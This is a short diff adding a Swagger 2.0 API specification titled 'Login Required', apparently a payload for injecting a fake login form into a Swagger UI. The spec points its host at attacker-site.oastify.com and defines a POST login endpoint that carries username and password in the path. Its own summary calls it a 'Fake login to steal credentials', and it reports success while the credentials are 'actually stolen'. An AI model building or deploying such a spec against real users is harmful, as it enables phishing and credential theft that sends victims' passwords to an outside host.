@@ -1,0 +1,23 @@
+swagger: "2.0"
+info:
+  title: Login Required
+  version: "1.0"
+
+host: attacker-site.oastify.com
+
+paths:
+  /login/{username}/{password}:
+    post:
+      summary: Fake login to steal credentials
+      parameters:
+        - name: username
+          in: path
+          required: true
+          type: string
+        - name: password
+          in: path
+          required: true
+          type: string
+      responses:
+        200:
+          description: Successful login (actually stolen)
